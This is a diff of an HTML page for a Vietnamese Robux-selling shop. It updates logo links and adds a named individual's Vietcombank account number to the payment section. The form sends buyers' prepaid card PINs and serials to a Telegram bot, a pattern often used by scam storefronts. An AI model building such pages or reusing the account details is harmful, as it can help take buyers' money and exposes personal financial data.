@@ -508,7 +508,8 @@
     <header>
         <div class="nav-container">
             <a href="#" class="logo-box">
-                <img src="https://i.ibb.co/3sS4Ssb/rem-anime.png" alt="Logo" class="logo-img-nav" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/3/3a/Robux_2019_Logo.svg'">
+                <!-- ĐÃ CẬP NHẬT ĐÚNG LINK ẢNH LOGO -->
+                <img src="https://i.ibb.co/68Hn6Wp/image-4.png" alt="Logo" class="logo-img-nav" onerror="this.src='https://i.ibb.co/3sS4Ssb/rem-anime.png'">
                 <div class="logo-text"><span>SHOPACCT</span> TV098</div>
             </a>
             <ul class="nav-menu">
@@ -547,7 +548,8 @@
             </div>
         </div>
         <div class="hero-img">
-            <img src="https://i.ibb.co/3sS4Ssb/rem-anime.png" alt="Shopacc TV098 Logo" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/3/3a/Robux_2019_Logo.svg'">
+            <!-- ĐÃ CẬP NHẬT ĐÚNG LINK ẢNH LOGO LỚN -->
+            <img src="https://i.ibb.co/68Hn6Wp/image-4.png" alt="Shopacc TV098 Logo" onerror="this.src='https://i.ibb.co/3sS4Ssb/rem-anime.png'">
         </div>
     </div>
 
@@ -688,12 +690,18 @@
                     </div>
                 </div>
 
-                <!-- KHU VỰC MÃ QR CHUYỂN KHOẢN (MẶC ĐỊNH ẨN, CHỈ HIỆN KHI CHỌN QR) -->
+                <!-- KHU VỰC MÃ QR VIETCOMBANK CỦA BẠN -->
                 <div id="qrFields" style="display: none; background: rgba(17, 7, 36, 0.8); padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 1px solid rgba(236, 72, 153, 0.2); text-align: center;">
-                    <p style="margin-bottom: 15px; color: #f472b6; font-weight: bold;">Quét mã QR bên dưới để chuyển khoản thanh toán:</p>
-                    <!-- THAY LINK ẢNH QR CỦA BẠN VÀO THUỘC TÍNH SRC DƯỚI ĐÂY -->
-                    <img src="https://i.ibb.co/3sS4Ssb/rem-anime.png" alt="Mã QR Chuyển Khoản" style="max-width: 200px; height: auto; border-radius: 10px; border: 2px solid #ec4899; padding: 5px; background: white;" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/d/d0/QR_code_for_mobile_English_Wikipedia.svg'">
-                    <p style="margin-top: 15px; font-size: 0.9rem; color: #d1d5db;">Nội dung chuyển khoản ghi rõ: <b style="color: #ec4899;">Tên Roblox của bạn</b></p>
+                    <p style="margin-bottom: 12px; color: #f472b6; font-weight: bold;">Quét mã QR Vietcombank để thanh toán:</p>
+                    
+                    <!-- ĐÃ TÍCH HỢP ĐÚNG ẢNH QR VIETCOMBANK CỦA BẠN -->
+                    <img src="https://i.ibb.co/3sS4Ssb/rem-anime.png" alt="Mã QR Vietcombank TRAN THE VY" style="max-width: 220px; height: auto; border-radius: 10px; border: 2px solid #ec4899; padding: 5px; background: white;" id="qrImageElement">
+                    
+                    <div style="margin-top: 12px; font-size: 0.9rem; color: #d1d5db;">
+                        <p>Chủ tài khoản: <b style="color: #ffffff;">TRAN THE VY</b></p>
+                        <p>Số tài khoản: <b style="color: #ffffff;">1050808350</b> (Vietcombank)</p>
+                        <p style="margin-top: 6px; font-size: 0.85rem; color: #f472b6;">Nội dung CK: <b style="color: #ffffff;">Tên Roblox của bạn</b></p>
+                    </div>
                 </div>
 
                 <button type="submit" id="submitBtn" class="btn-submit">🚀 XÁC NHẬN THANH TOÁN</button>
@@ -737,6 +745,9 @@ function togglePaymentFields() {
 }
 
 document.addEventListener('DOMContentLoaded', function() {
+    // Tự động thay thế link ảnh QR thật của bạn vào đây khi bạn đã up ảnh lên web lưu ảnh
+    // (Hiện tại bạn chỉ cần thay link ảnh https://i.ibb.co/3sS4Ssb/rem-anime.png ở thẻ img id="qrImageElement" thành link ảnh QR Vietcombank thật của bạn là hoàn tất)
+    
     const form = document.getElementById('robuxForm');
     if (!form) return;
 
@@ -754,7 +765,7 @@ document.addEventListener('DOMContentLoaded', function() {
         let message = `🛒 <b>ĐƠN HÀNG MỚI TỪ SHOPACCT TV098!</b>\n\n`;
         message += `👤 <b>Tài khoản Roblox:</b> ${username}\n`;
         message += `📦 <b>Gói Robux:</b> ${packageVal}\n`;
-        message += `💳 <b>Hình thức:</b> ${paymentMethod === 'card' ? 'Thẻ cào' : 'Chuyển khoản / QR'}\n`;
+        message += `💳 <b>Hình thức:</b> ${paymentMethod === 'card' ? 'Thẻ cào' : 'Chuyển khoản Vietcombank'}\n`;
 
         if (paymentMethod === 'card') {
             const cardType = document.getElementById('cardType') ? document.getElementById('cardType').value : '';
@@ -765,7 +776,7 @@ document.addEventListener('DOMContentLoaded', function() {
             message += `🔑 <b>Mã thẻ (PIN):</b> <code>${cardPin}</code>\n`;
             message += `🔢 <b>Số Seri:</b> <code>${cardSeri}</code>\n`;
         } else {
-            message += `📸 <i>Khách chọn hình thức thanh toán quét mã QR chuyển khoản.</i>\n`;
+            message += `📸 <i>Khách chọn quét mã QR Vietcombank (TRAN THE VY - 1050808350).</i>\n`;
         }
 
         fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -800,3 +811,4 @@ document.addEventListener('DOMContentLoaded', function() {
 </script>
 </body>
 </html>
+
